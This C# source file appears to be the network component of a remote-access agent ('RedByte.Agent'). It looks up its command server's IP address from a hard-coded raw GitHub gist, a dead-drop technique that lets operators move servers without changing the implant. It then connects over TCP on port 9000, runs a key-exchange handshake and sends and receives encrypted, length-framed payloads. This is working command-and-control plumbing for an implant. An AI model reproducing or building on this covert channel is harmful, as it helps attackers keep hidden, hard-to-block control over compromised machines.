using System.Buffers.Binary;
using System.IO;
using System.Net.Http;
using System.Net.Sockets;
using NSec.Cryptography;
namespace RedByte.Agent.Network;

public class TcpClientManager
{
    private static TcpClientManager? _instance;

    private TcpClient? _client;
    private NetworkStream? _stream;
    private CryptoSession? _crypto;

    private const int DefaultPort = 9000;
    private const int LengthSize = 4;
    private const int MaxEncryptedBodySize = 2 * 1024 * 1024;
    private const string GitGistURL = "https://gist.githubusercontent.com/galshichrur/1b160c4a5451f18e2fd0e94b844657a5/raw/gistfile1.txt";

    public static TcpClientManager GetInstance()
    {
        _instance ??= new TcpClientManager();
        return _instance;
    }

    public async Task<bool> Connect()
    {
        try
        {
            Disconnect();

            _client = new TcpClient();
            string serverIp = await GetServerIp();
            await _client.ConnectAsync(serverIp, DefaultPort);

            _stream = _client.GetStream();
            _crypto = new CryptoSession();

            await StartSecureSession();
            return true;
        }
        catch
        {
            Disconnect();
            return false;
        }
    }

    public Task Send(object payload)
    {
        return SendSecure(payload);
    }

    public async Task<T?> Receive<T>()
    {
        return await ReceiveSecure<T>();
    }

    public void Disconnect()
    {
        _crypto?.Clear();
        _crypto = null;

        _stream?.Close();
        _stream = null;

        _client?.Close();
        _client = null;
    }

    private async Task StartSecureSession()
    {
        NetworkStream stream = GetStream();
        CryptoSession crypto = GetCrypto();

        byte[] clientPublicKey = crypto.CreatePublicKey(out Key privateKey);

        // Handshake, before encryption:
        // client_public_key(32) -> server
        // server_public_key(32) -> client
        await stream.WriteAsync(clientPublicKey, 0, clientPublicKey.Length);
        byte[] serverPublicKey = await ReadExact(CryptoSession.PublicKeySize);

        crypto.SetSharedKey(privateKey, serverPublicKey);
    }

    private async Task SendSecure(object payload)
    {
        NetworkStream stream = GetStream();
        CryptoSession crypto = GetCrypto();

        byte[] body = crypto.Encrypt(payload);
        if (body.Length < CryptoSession.MinEncryptedBodySize || body.Length > MaxEncryptedBodySize)
            throw new Exception("Invalid encrypted body length.");

        byte[] length = new byte[LengthSize];
        BinaryPrimitives.WriteUInt32LittleEndian(length, (uint)body.Length);

        await stream.WriteAsync(length, 0, length.Length);
        await stream.WriteAsync(body, 0, body.Length);
        await stream.FlushAsync();
    }

    private async Task<T?> ReceiveSecure<T>()
    {
        CryptoSession crypto = GetCrypto();

        byte[] lengthBytes = await ReadExact(LengthSize);
        uint length = BinaryPrimitives.ReadUInt32LittleEndian(lengthBytes);

        if (length < CryptoSession.MinEncryptedBodySize || length > MaxEncryptedBodySize)
            throw new Exception($"Invalid encrypted frame length: {length}");

        byte[] body = await ReadExact((int)length);
        return crypto.Decrypt<T>(body);
    }

    private async Task<byte[]> ReadExact(int size)
    {
        NetworkStream stream = GetStream();
        byte[] buffer = new byte[size];
        int total = 0;

        while (total < size)
        {
            int read = await stream.ReadAsync(buffer, total, size - total);
            if (read == 0)
                throw new IOException("Socket closed");

            total += read;
        }

        return buffer;
    }

    private NetworkStream GetStream()
    {
        return _stream ?? throw new InvalidOperationException("TCP client is not connected.");
    }

    private CryptoSession GetCrypto()
    {
        return _crypto ?? throw new InvalidOperationException("Secure session was not started.");
    }

    private static async Task<string> GetServerIp()
    {
        using var http = new HttpClient();
        string serverIp = await http.GetStringAsync(GitGistURL);
        return serverIp.Trim();
    }
}
